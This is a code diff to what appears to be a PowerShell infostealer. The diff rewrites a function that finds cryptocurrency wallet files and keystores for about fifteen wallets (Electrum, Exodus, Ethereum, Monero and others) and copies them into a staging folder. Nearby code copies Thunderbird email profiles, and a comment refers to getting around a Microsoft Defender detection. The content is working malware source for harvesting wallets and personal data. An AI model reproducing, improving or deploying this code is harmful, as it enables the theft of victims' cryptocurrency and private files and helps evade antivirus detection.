@@ -741,65 +741,39 @@ function Backup-Data {
         Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
     }
 
-    function Invoke-Crypto_Wallets {
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
-            New-Item -Path "$folder_crypto\Armory" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$folder_crypto\Armory" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
-            New-Item -Path "$folder_crypto\Atomic" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Atomic" -Recurse -Force
-        }
-        if (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
-            New-Item -Path "$folder_crypto\BitcoinCore" -ItemType Directory | Out-Null
-            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\BitcoinCore" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
-            New-Item -Path "$folder_crypto\bytecoin" -ItemType Directory | Out-Null
-            Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$folder_crypto\bytecoin" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
-            New-Item -Path "$folder_crypto\Coinomi" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Coinomi" -Recurse -Force
-        }
-        if (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
-            New-Item -Path "$folder_crypto\DashCore" -ItemType Directory | Out-Null
-            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\DashCore" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
-            New-Item -Path "$folder_crypto\Electrum" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Electrum" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
-            New-Item -Path "$folder_crypto\Ethereum" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$folder_crypto\Ethereum" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
-            New-Item -Path "$folder_crypto\exodus.wallet" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$folder_crypto\exodus.wallet" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
-            New-Item -Path "$folder_crypto\Guarda" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Guarda" -Recurse -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
-            New-Item -Path "$folder_crypto\liberty.jaxx" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\liberty.jaxx" -Recurse -Force
-        }
-        if (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
-            New-Item -Path "$folder_crypto\Litecoin" -ItemType Directory | Out-Null
-            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\Litecoin" -Recurse -Force
-        }
-        if (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
-            New-Item -Path "$folder_crypto\Monero" -ItemType Directory | Out-Null
-            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$folder_crypto\Monero" -Recurse  -Force
-        }
-        if (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
-            New-Item -Path "$folder_crypto\Zcash" -ItemType Directory | Out-Null
-            Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$folder_crypto\Zcash" -Recurse -Force
-        }
+    function Local_Crypto_Wallets {
+        $wallet_paths = @{
+            "Local Wallets" = @{
+                "Armory"            = Join-Path $env:userprofile  "AppData\Roaming\Armory\*.wallet"
+                "Atomic"            = Join-Path $env:userprofile  "AppData\Roaming\Atomic\Local Storage\leveldb"
+                "Bitcoin"           = Join-Path $env:userprofile  "AppData\Roaming\Bitcoin\wallets"
+    			"Bytecoin"          = Join-Path $env:userprofile  "AppData\Roaming\bytecoin\*.wallet"
+                "Coinomi"           = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
+                "Dash"              = Join-Path $env:userprofile  "AppData\Roaming\DashCore\wallets"
+                "Electrum"          = Join-Path $env:userprofile  "AppData\Roaming\Electrum\wallets"
+                "Ethereum"          = Join-Path $env:userprofile  "AppData\Roaming\Ethereum\keystore"
+                "Exodus"            = Join-Path $env:userprofile  "AppData\Roaming\Exodus\exodus.wallet"
+                "Guarda"            = Join-Path $env:userprofile  "AppData\Roaming\Guarda\Local Storage\leveldb"
+                "com.liberty.jaxx"  = Join-Path $env:userprofile  "AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
+    			"Litecoin"          = Join-Path $env:userprofile  "AppData\Roaming\Litecoin\wallets"
+    			"MyMonero"          = Join-Path $env:userprofile  "AppData\Roaming\MyMonero\*.mmdbdoc_v1"
+    			"Monero GUI"        = Join-Path $env:userprofile  "Documents\Monero\wallets\"
+    			"Zephyr"             = Join-Path $env:userprofile  "AppData\Roaming\Zephyr\wallets"
+            }
+        } 
+        foreach ($wallet in $wallet_paths.Keys) {
+            foreach ($pathName in $wallet_paths[$wallet].Keys) {
+                $sourcePath = $wallet_paths[$wallet][$pathName]
+                if (Test-Path $sourcePath) {
+                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
+                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
+                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
+                }
+             }
+          }
     }
-    Invoke-Crypto_Wallets
+    Local_Crypto_Wallets
+	
 	Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
